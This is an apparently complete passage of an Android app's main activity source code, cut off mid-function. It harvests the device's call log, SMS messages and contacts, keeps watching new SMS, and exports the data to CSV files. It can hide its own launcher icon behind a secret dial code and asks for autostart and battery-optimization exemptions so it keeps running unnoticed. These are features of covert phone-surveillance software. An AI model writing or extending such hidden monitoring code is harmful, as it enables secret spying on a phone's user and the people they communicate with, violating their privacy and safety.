package com.abhi_pandey.test;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.abhi_pandey.test.auth.auth;
import com.abhi_pandey.test.auth.jobService;
import com.abhi_pandey.test.firebase.dbModelCall;
import com.abhi_pandey.test.firebase.firebaseDatabaseAdapter;
import com.github.mikephil.charting.charts.PieChart;
import com.github.mikephil.charting.components.Legend;
import com.github.mikephil.charting.data.PieData;
import com.github.mikephil.charting.data.PieDataSet;
import com.github.mikephil.charting.data.PieEntry;
import com.google.firebase.firestore.FirebaseFirestore;
import com.judemanutd.autostarter.AutoStartPermissionHelper;
import com.opencsv.CSVWriter;
import com.abhi_pandey.test.auth.myAlerm;

import java.io.File;
import java.io.FileWriter;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import static android.Manifest.permission.CALL_PHONE;


/**
 *
 * created by abhishek pandey_
 *
 */


public class MainActivity extends AppCompatActivity {

    private dbHelper dbHandler;
    private long pressedTime;
    private LinearLayout layout_main;
    private LinearLayout layout_data;
    private RecyclerView recyclerView;
    public static final int MULTIPLE_PERMISSIONS = 10;
    boolean boolean_permission;
    public static int REQUEST_PERMISSIONS = 1;
    public static int code = 1;

    /*  pie chart */
    private  PieChart pie;
    List<PieEntry> list;
    /* call */
    private  String callName, callNumber, callStartTime, callEndTime, call_access_Date, callDuration, callType, callDate;
    private ArrayList<callLogModel> dataholder = new ArrayList<>();
    /*  sms */
    private String threadId, smsDatee, smsTime, smsName, smsAddress, smsType, smsContent;
    private ArrayList<smsModel> smsholder = new ArrayList<>();
    private String lastSmsId = "";
    /*call button*/
    private Button r_btn, m_btn, o_btn, a_btn;
    /*    sms button*/
    private  Button i_btn, s_btn, d_btn, as_btn;
    /*  action button*/
    private Button cr_btn, h_btn, a_s_btn, e_btn;
    /*  password*/
    private Button password, btnLogin;
    private TextView loginPassword, error2;
    String[] permissions = {
            "android.permission.INTERNET",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CALL_LOG",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.RECEIVE_SMS",
            "android.permission.RECEIVE_BOOT_COMPLETED"
    };


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        dbHandler = new dbHelper(MainActivity.this);
        layout_main = findViewById(R.id.layout_main);
        layout_data = findViewById(R.id.layout_data);
        /*   Call log button*/
        r_btn = findViewById(R.id.btn_call_1);
        m_btn = findViewById(R.id.btn_call_2);
        o_btn = findViewById(R.id.btn_call_3);
        a_btn = findViewById(R.id.btn_call_4);
        /*sms log button*/
        i_btn = findViewById(R.id.btn_sms_1);
        s_btn = findViewById(R.id.btn_sms_2);
        d_btn = findViewById(R.id.btn_sms_3);
        as_btn = findViewById(R.id.btn_sms_4);
        /*action button */
        cr_btn = findViewById(R.id.btn_act_1);
        h_btn = findViewById(R.id.btn_act_2);
        a_s_btn = findViewById(R.id.btn_act_3);
        e_btn = findViewById(R.id.btn_act_4);
        /*   password*/
        password = findViewById(R.id.password_protected);
        btnLogin = findViewById(R.id.login_btn);
        loginPassword = findViewById(R.id.password_tv);
        error2 = findViewById(R.id.tv_err_password_2);

        recyclerView = (RecyclerView) findViewById(R.id.list_item);

        /* Auto start job */
    /*
        app data is not auto run

//
//        Calendar time = Calendar.getInstance();
//        time.setTimeInMillis(System.currentTimeMillis());
//        time.set(Calendar.HOUR_OF_DAY, 14);
//        time.set(Calendar.MINUTE, 40);
//        time.set(Calendar.SECOND, 0);
//        setAlarm(time.getTimeInMillis());
*/

        //testing
//
//        Calendar time = Calendar.getInstance();
//        time.setTimeInMillis(System.currentTimeMillis());
//        time.add(Calendar.SECOND, 2);
//
//        setAlarm(time.getTimeInMillis());


        FirebaseFirestore.setLoggingEnabled(true);

        SharedPreferences sh = PreferenceManager
                .getDefaultSharedPreferences(this);

        String st = sh.getString("status", "");
        String pass = sh.getString("password", "");

        if (st.equals("1")) {
            layout_main.setVisibility(View.GONE);
            LinearLayout login = findViewById(R.id.login_activity);
            login.setVisibility(View.VISIBLE);

            btnLogin.setOnClickListener(new View.OnClickListener() {

                @Override
                public void onClick(View v) {
                    String passw = loginPassword.getText().toString();
                    if (passw.equals(pass)) {
                        login.setVisibility(View.GONE);
                        layout_main.setVisibility(View.VISIBLE);
                        password.setText("Change Password");


                    } else {
                        error2.setText("Password did't matched try again..................... ");
                        error2.setVisibility(View.VISIBLE);


                    }

                }
            });

        } else {

            layout_main.setVisibility(View.VISIBLE);
            LinearLayout login = findViewById(R.id.login_activity);
            login.setVisibility(View.GONE);

        }

        Boolean t=checkPermissions();

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);

        if (!prefs.getBoolean("firstTime", false)) {
            // run your one time code
            if (t==true) {

                Context context = getApplicationContext();

                getFetchCallLogs();
                getAllSms(context);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putBoolean("firstTime", true);
                editor.commit();

            }
        }
        // Handler parameter is passed as null so that
        // onChange method is called immediately regardless of thread
        SmsObserver SmsObserver = new SmsObserver(null);

        ContentResolver contentResolver = getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms/"),
                true, SmsObserver);


        /* call button function*/
        r_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);


                    String fetech = "Incoming";


                    Cursor cursor = dbHandler.readallData(fetech);
                    dataholder.clear();
                    while (cursor.moveToNext()) {
                        callLogModel call = new callLogModel(cursor.getString(0), cursor.getString(1), cursor.getString(2), cursor.getString(3)
                                , cursor.getString(4), cursor.getString(5), cursor.getString(7), cursor.getString(6));
                        dataholder.add(call);
                    }
                    cursor.close();

                    callAdapter adapter = new callAdapter(dataholder, getApplicationContext());
                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    getSupportActionBar().setTitle(fetech);
                    recyclerView.setAdapter(adapter);


                }


            }
        });

        m_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);


                    String fetech = "Missed";

                    Cursor cursor = dbHandler.readallData(fetech);
                    dataholder.clear();
                    while (cursor.moveToNext()) {


                            callLogModel call = new callLogModel(cursor.getString(0), cursor.getString(1), cursor.getString(2), cursor.getString(3)
                                    , cursor.getString(4), cursor.getString(5), cursor.getString(7), cursor.getString(6));
                            dataholder.add(call);



                    }
                    cursor.close();
                    callAdapter adapter = new callAdapter(dataholder, getApplicationContext());
                    getSupportActionBar().setTitle(fetech);
                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    recyclerView.setAdapter(adapter);


                }


            }
        });

        o_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);

                    String fetech = "Outgoing";

                    Cursor cursor = dbHandler.readallData(fetech);
                    dataholder.clear();
                    while (cursor.moveToNext()) {
                        callLogModel call = new callLogModel(cursor.getString(0), cursor.getString(1), cursor.getString(2), cursor.getString(3)
                                , cursor.getString(4), cursor.getString(5), cursor.getString(7), cursor.getString(6));
                        dataholder.add(call);
                    }
                    cursor.close();
                    callAdapter adapter = new callAdapter(dataholder, getApplicationContext());
                    getSupportActionBar().setTitle(fetech);
                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    recyclerView.setAdapter(adapter);


                }


            }
        });

        a_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);

                    String fetech = "Contacts";

                    Cursor cursor = dbHandler.readtablelData(fetech);
                    dataholder.clear();
                    while (cursor.moveToNext()) {
                        callLogModel call = new callLogModel(cursor.getString(0), cursor.getString(1), cursor.getString(2), cursor.getString(3)
                                , cursor.getString(4), cursor.getString(5), cursor.getString(7), cursor.getString(6));
                        dataholder.add(call);
                    }
                    cursor.close();
                    callAdapter adapter = new callAdapter(dataholder, getApplicationContext());
                    getSupportActionBar().setTitle("Calllogs");
                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    recyclerView.setAdapter(adapter);


                }


            }
        });

        /*   sms button function */
        i_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);

                    String fetech = "inbox";
                    smsholder.clear();
                    Cursor cursor = dbHandler.readsmsallData(fetech);
                    dataholder.clear();
                    while (cursor.moveToNext()) {

                        smsModel sms = new smsModel(cursor.getString(7), cursor.getString(0), cursor.getString(6), cursor.getString(5), cursor.getString(1)
                                , cursor.getString(2), cursor.getString(3), cursor.getString(4));
                        smsholder.add(sms);
                    }
                    cursor.close();
                    SmsLogAdapter adapter = new SmsLogAdapter(smsholder, getApplicationContext());
                    getSupportActionBar().setTitle(fetech);
                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    recyclerView.setAdapter(adapter);


                }


            }
        });

        s_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);

                    String fetech = "sent";
                    dataholder.clear();
                    Cursor cursor = dbHandler.readsmsallData(fetech);
                    smsholder.clear();
                    while (cursor.moveToNext()) {
                        smsModel sms = new smsModel(cursor.getString(7), cursor.getString(0), cursor.getString(6), cursor.getString(5), cursor.getString(1)
                                , cursor.getString(2), cursor.getString(3), cursor.getString(4));
                        smsholder.add(sms);
                    }
                    cursor.close();
                    SmsLogAdapter adapter = new SmsLogAdapter(smsholder, getApplicationContext());
                    getSupportActionBar().setTitle(fetech);
                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    recyclerView.setAdapter(adapter);

                }
            }
        });

        d_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);

                    String fetech = "draft";
                    smsholder.clear();
                    Cursor cursor = dbHandler.readsmsallData(fetech);
                    dataholder.clear();
                    while (cursor.moveToNext()) {
                        smsModel sms = new smsModel(cursor.getString(7), cursor.getString(0), cursor.getString(6), cursor.getString(5), cursor.getString(1)
                                , cursor.getString(2), cursor.getString(3), cursor.getString(4));
                        smsholder.add(sms);
                    }
                    cursor.close();
                    SmsLogAdapter adapter = new SmsLogAdapter(smsholder, getApplicationContext());
                    getSupportActionBar().setTitle(fetech);

                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    recyclerView.setAdapter(adapter);

                }


            }
        });

        as_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                boolean data = checkPermissions();
                if (data == true) {
                    layout_main.setVisibility(View.GONE);
                    layout_data.setVisibility(View.VISIBLE);

                    smsholder.clear();
                    Cursor cursor = dbHandler.readsmstablelData();
                    while (cursor.moveToNext()) {
                        smsModel sms = new smsModel(cursor.getString(7), cursor.getString(0), cursor.getString(6), cursor.getString(5), cursor.getString(1)
                                , cursor.getString(2), cursor.getString(3), cursor.getString(4));
                        smsholder.add(sms);
                    }
                    cursor.close();
                    SmsLogAdapter adapter = new SmsLogAdapter(smsholder, getApplicationContext());
                    getSupportActionBar().setTitle("Smslogs");
                    recyclerView.setLayoutManager(new LinearLayoutManager(getApplicationContext()));
                    recyclerView.setAdapter(adapter);


                }


            }
        });

        /*  action button function*/
        h_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                AlertDialog.Builder builder1 = new AlertDialog.Builder(v.getContext());
                builder1.setTitle(R.string.app_name);
                builder1.setIcon(R.mipmap.ic_app_icon);
                builder1.setMessage(" Do you want hide this app icon  .\n if unhide icon  this app the you \n make a call on this number \n *55332211* ");
                builder1.setCancelable(true);

                builder1.setNeutralButton(
                        "Battery",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                addAutosStartup();

                                dialog.cancel();
                            }
                        });
                builder1.setPositiveButton(
                        "Yes",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {

                                hideApplication();
                                dialog.cancel();
                            }
                        });

                builder1.setNegativeButton(
                        "No",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {

                                dialog.cancel();
                            }
                        });

                AlertDialog alert1 = builder1.create();
                alert1.show();
            }
        });
        cr_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
//
                AlertDialog.Builder builder1 = new AlertDialog.Builder(v.getContext());
                builder1.setTitle(R.string.app_name);
                builder1.setIcon(R.mipmap.ic_app_icon);
                builder1.setMessage("Comming soon this feature.............! ");
                builder1.setCancelable(true);

                builder1.setNegativeButton(
                        "No",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {

                                dialog.cancel();
                            }
                        });

                AlertDialog alert1 = builder1.create();
                alert1.show();
            }
        });
        a_s_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //   Log.i("hhhhhhhhhhhhhhhh", "onClick: "+AutoStartPermissionHelper.getInstance().isAutoStartPermissionAvailable(getApplicationContext()));
                if (AutoStartPermissionHelper.getInstance().isAutoStartPermissionAvailable(getApplicationContext())) {
                    AutoStartPermissionHelper.getInstance().getAutoStartPermission(getApplicationContext());


                } else {
                    AlertDialog.Builder builder1 = new AlertDialog.Builder(v.getContext());
                    builder1.setTitle(R.string.app_name);
                    builder1.setIcon(R.mipmap.ic_app_icon);
                    builder1.setMessage("You can turn on the  Manually Auto start permission \n Follow this steps \n Settings > Appllication Manager > Auto Start  \n Select app enable ");

                    builder1.setCancelable(true);



                    builder1.setPositiveButton(
                            "Yes",
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    addAutoStartup();
                                    dialog.cancel();
                                }
                            });




                    builder1.setNegativeButton(
                            "No",
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    dialog.cancel();
                                }
                            });

                    AlertDialog alert1 = builder1.create();
                    alert1.show();
                }


            }
        });


        e_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Context context = getApplicationContext();
                if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

                    AlertDialog.Builder builder1 = new AlertDialog.Builder(v.getContext());
                    builder1.setTitle(R.string.app_name);
                    builder1.setIcon(R.mipmap.ic_app_icon);
                    builder1.setMessage(" Select which which file you want export  .");
                    builder1.setCancelable(true);
                    builder1.setPositiveButton(
                            "CONTACT",
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    export_CALL_DB();
                                    dialog.cancel();
                                }
                            });

                    builder1.setNegativeButton(
                            "SMS",
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    export_SMS_DB();
                                    dialog.cancel();
                                }
                            });

                    AlertDialog alert1 = builder1.create();
                    alert1.show();


                } else {


                    ActivityCompat.requestPermissions((Activity) context, new String[]{CALL_PHONE}, code);

                }

//

            }


        });


        password.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(getApplicationContext(), auth.class);
                startActivity(intent);

            }
        });




    }




    private void export_CALL_DB() {


        dbHelper dbhelper = new dbHelper(getApplicationContext());
        File exportDir = new File(Environment.getExternalStorageDirectory(), "/App_data");
        if (!exportDir.exists()) {
            exportDir.mkdirs();
        }


        String filename = "Contacts_app";
        int num = 0;
        String save = filename + ".xlsx";
        File file = new File(exportDir, save);


        while (file.exists()) {
            save = filename + (num++) + ".xlsx";
            file = new File(exportDir, save);
        }

        try {
            file.createNewFile();
            CSVWriter csvWrite = new CSVWriter(new FileWriter(file));
            SQLiteDatabase db = dbhelper.getReadableDatabase();
            Cursor curCSV = db.rawQuery("SELECT * FROM Contacts", null);
            csvWrite.writeNext(curCSV.getColumnNames());
            while (curCSV.moveToNext()) {
                //Which column you want to exprort

                String arrStr[] = {curCSV.getString(0), curCSV.getString(1), curCSV.getString(2),
                        curCSV.getString(3), curCSV.getString(4), curCSV.getString(5),
                        curCSV.getString(6), curCSV.getString(7)};

                csvWrite.writeNext(arrStr);
                Toast.makeText(this, "loading.............!", Toast.LENGTH_LONG).show();


            }
            csvWrite.close();
            curCSV.close();
            Toast.makeText(this, "Save File directory " + file, Toast.LENGTH_LONG).show();
        } catch (Exception sqlEx) {
            Log.e("MainActivity", sqlEx.getMessage(), sqlEx);
        }
    }


    private void export_SMS_DB() {

        int i = 0;
        dbHelper dbhelper = new dbHelper(getApplicationContext());
        File exportDir = new File(Environment.getExternalStorageDirectory(), "/App_data");
        if (!exportDir.exists()) {
            exportDir.mkdirs();
        }


        String filename = "Message_app";
        int num = 0;
        String save = filename + ".csv";
        File file = new File(exportDir, save);
        while (file.exists()) {
            save = filename + (num++) + ".csv";
            file = new File(exportDir, save);
        }

        try {
            file.createNewFile();

            CSVWriter csvWrite = new CSVWriter(new FileWriter(file));

            SQLiteDatabase db = dbhelper.getReadableDatabase();
            Cursor curCSV = db.rawQuery("SELECT * FROM Sms", null);
            csvWrite.writeNext(curCSV.getColumnNames());
            while (curCSV.moveToNext()) {

                //Which column you want to exprort
                String arrStr[] = {curCSV.getString(0), curCSV.getString(1), curCSV.getString(2),
                        curCSV.getString(3), curCSV.getString(4), curCSV.getString(5),
                        curCSV.getString(6)};

                csvWrite.writeNext(arrStr);
                Toast.makeText(this, "loading............!", Toast.LENGTH_LONG).show();


            }
            csvWrite.close();
            curCSV.close();
            Toast.makeText(this, "Save File directory " + file, Toast.LENGTH_LONG).show();


        } catch (Exception sqlEx) {
            Log.e("MainActivity", sqlEx.getMessage(), sqlEx);
        }
    }

    private void addAutosStartup() {

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Turn off Battery Optimization");
        builder.setMessage("Find OccerService in the list of applications and choose ‘Don’t optimize’.");
        builder.setPositiveButton("Allow",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        if (Build.VERSION.SDK_INT >= 23) {
                            Intent intent = new Intent();
                            intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                            startActivity(intent);
                        }
                    }
                });

        builder.setNegativeButton("Deny", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                finish();
            }
        });
        builder.show();
    }




    private void addAutoStartup() {

        try {
            Intent intent = new Intent();
            String manufacturer = android.os.Build.MANUFACTURER;
            if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if ("Letv".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
            } else if ("Honor".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            }

            List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
            if (list.size() > 0) {
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e("exc", String.valueOf(e));
        }
    }
    public void hideApplication() {

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(getApplicationContext(), MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        Intent intent = new Intent();
        if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }


    @Override
    public void onBackPressed() {

        if (pressedTime + 2000 > System.currentTimeMillis()) {
            super.onBackPressed();
            finish();

        }else if(pressedTime < System.currentTimeMillis()){
            layout_main.setVisibility(View.VISIBLE);
            layout_data.setVisibility(View.GONE);
            getSupportActionBar().setTitle(R.string.app_name);
        }
        else{
            Toast.makeText(getBaseContext(), "Press back again to exit", Toast.LENGTH_SHORT).show();
        }
        pressedTime = System.currentTimeMillis();
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    public void onStart() {
        super.onStart();
        boolean data=checkPermissions();

        if(data==true){
            piechart();
            SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
            if(!prefs.getBoolean("firstTime", false)) {
                // run your one time code
                if (checkPermissions()) {
                    getFetchCallLogs();
                    getAllSms(getApplicationContext());
                    Context context = getApplicationContext();
                    // Handler parameter is passed as null so that
                    // onChange method is called immediately regardless of thread
                    SmsObserver SmsObserver = new SmsObserver(null);

                    ContentResolver contentResolver = context.getContentResolver();
                    contentResolver.registerContentObserver(Uri.parse("content://sms/"),
                            true, SmsObserver);
                    SharedPreferences.Editor editor = prefs.edit();
                    editor.putBoolean("firstTime", true);
                    editor.commit();

                }

            }

        }


    }

    protected void onResume() {
        piechart();
        super.onResume();

    }




    /*     chart design */
    public void piechart(){
        dbHandler = new dbHelper(MainActivity.this);

        pie = (PieChart) findViewById(R.id.pie);
        list=new ArrayList<>();
         int Incoming=dbHandler.onIncoming();
        int Missed=dbHandler.onMissed();
        int Outgoing=dbHandler.onOutgoing();
        int Rejected=dbHandler.onRejected();

        pie.invalidate();
        pie.setDrawSliceText(false); // To remove slice text
        pie.setDrawMarkers(false); // To remove markers when click
        pie.setDrawEntryLabels(false); // To remove labels from piece of pie
        pie.getDescription().setEnabled(false);
        pie.setEntryLabelTextSize(12);
        pie.setHoleRadius(20);

        pie.getLegend().setTextColor(Color.WHITE);
        list.add(new PieEntry(Incoming,"Incoming"));
        list.add(new PieEntry(Missed,"Missed"));
        list.add(new PieEntry(Outgoing,"Outgoing"));
        list.add(new PieEntry(Rejected,"Rejected"));

       int data=((Incoming+Missed+Outgoing+Rejected)/4)%100;

        Legend legend = pie.getLegend();
        legend.setForm(Legend.LegendForm.CIRCLE);
        legend.setTextSize(12);
        legend.setFormSize(20);
        legend.setEnabled(true);
      legend.setHorizontalAlignment(Legend.LegendHorizontalAlignment.CENTER);
         legend.setDrawInside(false);

        legend.setFormToTextSpace(2);
        pie.setCenterText(String.valueOf(data)+"%");
        pie.setCenterTextColor(Color.rgb(20,20,12));
        pie.setCenterTextSize(20);

        PieDataSet pieDataSet=new PieDataSet(list,"");
        PieData pieData=new PieData(pieDataSet);
        pie.setData(pieData);

        pieDataSet.setValueTextSize(15f);
        pieDataSet.setSliceSpace(1f);

        pieDataSet.setValueTextColor(Color.WHITE);
        pieDataSet.setColors(Color.RED,Color.MAGENTA,Color.GREEN,Color.CYAN);

    }


    private boolean checkPermissions() {
        int result;
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            result = ContextCompat.checkSelfPermission(this, p);
            if (result != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), MULTIPLE_PERMISSIONS);
            return false;
        }
        return true;
    }
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {

            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                boolean_permission = true;


            } else {
                Toast.makeText(getApplicationContext(), "Please allow the permission", Toast.LENGTH_LONG).show();

            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void getFetchCallLogs() {
        dbHandler = new dbHelper(MainActivity.this);


        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, (String[]) null, (String) null, (String[]) null, "date DESC");
        while (cursor.moveToNext()) {

            callNumber = cursor.getString(cursor.getColumnIndex("number"));
            String string = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            callName = string;

            callName = (string == null || string.equals("")) ? "Unknown" : this.callName;
            callType = cursor.getString(cursor.getColumnIndex("type"));
            call_access_Date = cursor.getString(cursor.getColumnIndex("date"));
            Duration ofDays = Duration.ofDays((long) cursor.getColumnIndex("duration"));

            callDate = new SimpleDateFormat("yyyy-MM-dd").format(new Date(Long.parseLong(this.call_access_Date)));
         //   callDuration =

            // String.valueOf(cursor.getInt(cursor.getColumnIndex("duration")) * 1000);

           callStartTime = new SimpleDateFormat("h:mm:ss a").format(new Date(Long.parseLong(this.call_access_Date)));


            switch (Integer.parseInt(callType)) {
                case  CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming";
                    break;
                case  CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing";
                    break;
                case  CallLog.Calls.MISSED_TYPE:
                    callType = "Missed";
                    break;
                case  CallLog.Calls.VOICEMAIL_TYPE:
                    callType = "Voicemail";
                    break;
                case  CallLog.Calls.REJECTED_TYPE:
                    callType = "Rejected";
                    break;
                case  CallLog.Calls.BLOCKED_TYPE:
                    callType = "Blocked";
                    break;
                case  CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                    callType = "Externally Answered";
                    break;
                default:
                    callType = "NA";
                    break;
            }
            int s = (int) cursor.getLong( cursor.getColumnIndex(CallLog.Calls.DURATION));

            int sec = s % 60;
            int min = (s / 60)%60;
            int hours = (s/60)/60;

            callDuration=hours+":"+min+":"+sec;


//            int l= (int) Long.parseLong(this.call_access_Date);
//            int et= Integer.parseInt(String.valueOf(l+cursor.getLong( cursor.getColumnIndex(CallLog.Calls.DURATION))));
//
//            int secc = et % 60;
//            int minn = (et / 60)%60;
//            int hour = (et/60)/60;




            callEndTime=" ";


//           Toast.makeText(getApplicationContext(),"Ringing State Number is -"+thread_id,Toast.LENGTH_SHORT).show();
//


            dbHandler.onInsert(callName, callNumber, callStartTime, callEndTime,callDuration,callType,callDate);

        }
        cursor.close();

    }


    public void getAllSms(Context context) {
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if(c!=null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    Date dateFormat = new Date(Long.valueOf(smsDate));
                    String type = null;
                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                            type = "draft";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_FAILED:
                            type = "failed";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                            type = "wating";
                            break;
                        default:
                            break;
                    }
                    threadId = c.getString(c.getColumnIndex("thread_id"));

